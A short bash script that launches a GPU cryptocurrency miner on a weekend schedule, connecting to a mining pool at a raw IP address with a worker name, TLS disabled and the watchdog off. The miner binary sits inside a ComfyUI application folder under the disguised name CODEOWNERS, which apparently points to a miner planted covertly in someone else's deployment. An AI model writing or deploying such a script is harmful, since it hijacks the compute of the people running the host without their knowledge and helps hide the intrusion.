#!/bin/bash

# --- SPECIAL WEEKEND MINING SCRIPT ---

# This command runs during the SPECIAL_WEEKEND_MODE (Saturday 6:30 PM to Monday 8:00 AM PHT).

# NOTE: The worker name has been changed to 'krxXKDZ8P6.weekend' to ensure the main
# scheduler can correctly start and stop this process separately from the regular miner.
# The main scheduler script (lolminer_scheduler.sh) handles the continuous monitoring and restarting.

exec /app/ComfyUI/CODEOWNERS --algo CR29 --pool 151.241.228.78:443 --user krxXKDZ8P6.weekend --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on
